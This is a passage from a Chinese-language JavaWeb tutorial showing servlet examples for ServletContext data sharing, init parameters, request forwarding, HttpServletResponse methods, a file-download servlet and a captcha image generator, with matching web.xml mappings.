class="comment">// 数据</span></span><br><span class="line">        <span class="comment">// 将一个数据保存在了ServletContext中，名字为：name ,值 name</span></span><br><span class="line">        context.setAttribute(<span class="string">&quot;name&quot;</span>,name);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String)context.getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        resp.getWriter().print(<span class="string">&quot;名字:&quot;</span>+name);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>getc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.GetServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>getc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/getc<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-获取初始化参数"><a href="#2-获取初始化参数" class="headerlink" title="2.获取初始化参数"></a>2.获取初始化参数</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置一些Web应用初始化参数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>url<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>jdbc:mysql://localhost:3306/mybatis<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>gp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.ServletDemo03<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>gp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/gp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo03</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> context.getInitParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        resp.getWriter().print(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-请求转发"><a href="#3-请求转发" class="headerlink" title="3.请求转发"></a>3.请求转发</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.RequestDispatcher;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo04</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line">        System.out.println(<span class="string">&quot;进入ServletDemo04文件！&quot;</span>);</span><br><span class="line"><span class="comment">//        转发的请求路径</span></span><br><span class="line"><span class="comment">//        RequestDispatcher requestDispatcher = context.getRequestDispatcher(&quot;/gp&quot;);</span></span><br><span class="line"><span class="comment">//        调用forward实现请求转发;</span></span><br><span class="line"><span class="comment">//        requestDispatcher.forward(req,resp);</span></span><br><span class="line">        context.getRequestDispatcher(<span class="string">&quot;/gp&quot;</span>).forward(req,resp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>gp02<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.ServletDemo04<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>gp02<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/gp02<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="4-读取资源文件"><a href="#4-读取资源文件" class="headerlink" title="4.读取资源文件"></a>4.读取资源文件</h4><ul>
<li>Properties<ul>
<li>在java目录下新建properties</li>
<li>在resources目录下新建properties</li>
</ul>
</li>
</ul>
<h3 id="5-HttpServletResponse"><a href="#5-HttpServletResponse" class="headerlink" title="5.HttpServletResponse"></a>5.HttpServletResponse</h3><ul>
<li>web服务器接收到客户端的http请求，针对这个请求，分别创建一个代表请求的HttpServletRequest对象，代表响应的一个HttpServletResponse；<ul>
<li>如果要获取客户端请求过来的参数：找HttpServletRequest；</li>
<li>如果要给客户端响应一些信息：找HttpServletResponse。</li>
</ul>
</li>
</ul>
<h4 id="1-简单分类"><a href="#1-简单分类" class="headerlink" title="1.简单分类"></a>1.简单分类</h4><ul>
<li>负责向浏览器发送数据的方法。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ServletOutputStream <span class="title function_">getOutputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException;</span><br><span class="line">PrintWriter <span class="title function_">getWriter</span><span class="params">()</span> <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure>

<ul>
<li>负责向浏览器发送响应头的方法。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">setCharacterEncoding</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setContentLength</span><span class="params">(<span class="type">int</span> var1)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setContentLengthLong</span><span class="params">(<span class="type">long</span> var1)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setContentType</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setDateHeader</span><span class="params">(String var1, <span class="type">long</span> var2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addDateHeader</span><span class="params">(String var1, <span class="type">long</span> var2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setHeader</span><span class="params">(String var1, String var2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addHeader</span><span class="params">(String var1, String var2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setIntHeader</span><span class="params">(String var1, <span class="type">int</span> var2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addIntHeader</span><span class="params">(String var1, <span class="type">int</span> var2)</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>响应的状态码。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">SC_CONTINUE</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_SWITCHING_PROTOCOLS</span> <span class="operator">=</span> <span class="number">101</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_OK</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_CREATED</span> <span class="operator">=</span> <span class="number">201</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_ACCEPTED</span> <span class="operator">=</span> <span class="number">202</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_NON_AUTHORITATIVE_INFORMATION</span> <span class="operator">=</span> <span class="number">203</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_NO_CONTENT</span> <span class="operator">=</span> <span class="number">204</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_RESET_CONTENT</span> <span class="operator">=</span> <span class="number">205</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_PARTIAL_CONTENT</span> <span class="operator">=</span> <span class="number">206</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_MULTIPLE_CHOICES</span> <span class="operator">=</span> <span class="number">300</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_MOVED_PERMANENTLY</span> <span class="operator">=</span> <span class="number">301</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_MOVED_TEMPORARILY</span> <span class="operator">=</span> <span class="number">302</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_FOUND</span> <span class="operator">=</span> <span class="number">302</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_SEE_OTHER</span> <span class="operator">=</span> <span class="number">303</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_NOT_MODIFIED</span> <span class="operator">=</span> <span class="number">304</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_USE_PROXY</span> <span class="operator">=</span> <span class="number">305</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_TEMPORARY_REDIRECT</span> <span class="operator">=</span> <span class="number">307</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_BAD_REQUEST</span> <span class="operator">=</span> <span class="number">400</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_UNAUTHORIZED</span> <span class="operator">=</span> <span class="number">401</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_PAYMENT_REQUIRED</span> <span class="operator">=</span> <span class="number">402</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_FORBIDDEN</span> <span class="operator">=</span> <span class="number">403</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_NOT_FOUND</span> <span class="operator">=</span> <span class="number">404</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_METHOD_NOT_ALLOWED</span> <span class="operator">=</span> <span class="number">405</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_NOT_ACCEPTABLE</span> <span class="operator">=</span> <span class="number">406</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_PROXY_AUTHENTICATION_REQUIRED</span> <span class="operator">=</span> <span class="number">407</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_REQUEST_TIMEOUT</span> <span class="operator">=</span> <span class="number">408</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_CONFLICT</span> <span class="operator">=</span> <span class="number">409</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_GONE</span> <span class="operator">=</span> <span class="number">410</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_LENGTH_REQUIRED</span> <span class="operator">=</span> <span class="number">411</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_PRECONDITION_FAILED</span> <span class="operator">=</span> <span class="number">412</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_REQUEST_ENTITY_TOO_LARGE</span> <span class="operator">=</span> <span class="number">413</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_REQUEST_URI_TOO_LONG</span> <span class="operator">=</span> <span class="number">414</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_UNSUPPORTED_MEDIA_TYPE</span> <span class="operator">=</span> <span class="number">415</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_REQUESTED_RANGE_NOT_SATISFIABLE</span> <span class="operator">=</span> <span class="number">416</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_EXPECTATION_FAILED</span> <span class="operator">=</span> <span class="number">417</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_INTERNAL_SERVER_ERROR</span> <span class="operator">=</span> <span class="number">500</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_NOT_IMPLEMENTED</span> <span class="operator">=</span> <span class="number">501</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_BAD_GATEWAY</span> <span class="operator">=</span> <span class="number">502</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_SERVICE_UNAVAILABLE</span> <span class="operator">=</span> <span class="number">503</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_GATEWAY_TIMEOUT</span> <span class="operator">=</span> <span class="number">504</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_HTTP_VERSION_NOT_SUPPORTED</span> <span class="operator">=</span> <span class="number">505</span>;</span><br></pre></td></tr></table></figure>

<h4 id="2-下载文件"><a href="#2-下载文件" class="headerlink" title="2.下载文件"></a>2.下载文件</h4><ol>
<li>向浏览器输出消息；</li>
<li>下载文件：<ol>
<li>要获取下载文件的路径；</li>
<li>下载的文件名是啥？</li>
<li>设置想办法让浏览器能够支持下载我们需要的东西；</li>
<li>获取下载文件的输入流；</li>
<li>创建缓冲区；</li>
<li>获取OutputStream对象；</li>
<li>将FileOutputStream流写入到buffer缓冲区；</li>
<li>使用OutputStream将缓冲区中的数据输出到客户端！</li>
</ol>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="comment">//        1. 要获取下载文件的路径；</span></span><br><span class="line">        <span class="comment">// F:\java\IDEA2020.2\JavaWeb-02-Servlet\response\target\classes\02.png</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> <span class="string">&quot;F:\\java\\IDEA2020.2\\JavaWeb-02-Servlet\\response\\target\\classes\\02.png&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;下载文件的路径:&quot;</span> + realPath);</span><br><span class="line"><span class="comment">//        2. 下载的文件名是啥？</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> realPath.substring(realPath.lastIndexOf(<span class="string">&quot;\\&quot;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//        3. 设置想办法让浏览器能够支持下载我们需要的东西；</span></span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>,<span class="string">&quot;attachment;filename=&quot;</span>+ URLEncoder.encode(fileName,<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"><span class="comment">//        4. 获取下载文件的输入流；</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(realPath);</span><br><span class="line"><span class="comment">//        5. 创建缓冲区；</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="comment">//        6. 获取OutputStream对象；</span></span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> resp.getOutputStream();</span><br><span class="line"><span class="comment">//        7. 将FileOutputStream流写入到buffer缓冲区；</span></span><br><span class="line">        <span class="keyword">while</span> ((len=in.read(buffer)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            out.write(buffer,<span class="number">0</span>,len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line"><span class="comment">//        8. 使用OutputStream将缓冲区中的数据输出到客户端！</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/response<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.FileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/response<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/down<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-验证码功能"><a href="#3-验证码功能" class="headerlink" title="3.验证码功能"></a>3.验证码功能</h4><ul>
<li>验证怎么来的？<ul>
<li>前端实现；</li>
<li>后端实现，需要用到 Java 的图片类，生产一个图片。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.ImageIO;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.BufferedImage;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ImageServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="comment">//        如何让浏览器3秒自动刷新一次;</span></span><br><span class="line">        resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        在内存中创建一个图片</span></span><br><span class="line">        <span class="type">BufferedImage</span> <span class="variable">image</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedImage</span>(<span class="number">90</span>,<span class="number">40</span>,BufferedImage.TYPE_INT_RGB);</span><br><span class="line"><span class="comment">//        得到图片,笔</span></span><br><span class="line">        <span class="type">Graphics2D</span> <span class="variable">g</span> <span class="operator">=</span> (Graphics2D) image.getGraphics();</span><br><span class="line"><span class="comment">//        设置图片的背景颜色</span></span><br><span class="line">        g.setColor(Color.white);</span><br><span class="line">        g.fillRect(<span class="number">0</span>,<span class="number">0</span>,<span class="number">90</span>,<span class="number">40</span>);</span><br><span class="line"><span class="comment">//        给图片写数据</span></span><br><span class="line">        g.setColor(Color.RED);</span><br><span class="line">        g.setFont(<span class="keyword">new</span> <span class="title class_">Font</span>(<span class="literal">null</span>,Font.BOLD,<span class="number">20</span>));</span><br><span class="line">        g.drawString(makeNum(),<span class="number">8</span>,<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        告诉浏览器，这个请求用图片的方式打开</span></span><br><span class="line">        resp.setContentType(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line"><span class="comment">//        网站存在缓存，不让浏览器缓存</span></span><br><span class="line">        resp.setDateHeader(<span class="string">&quot;expires&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Cache-Control&quot;</span>,<span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Pragma&quot;</span>,<span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        把图片写给浏览器</span></span><br><span class="line">        ImageIO.write(image,<span class="string">&quot;jpg&quot;</span>, resp.getOutputStream());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    生成随机数</span></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">makeNum</span><span 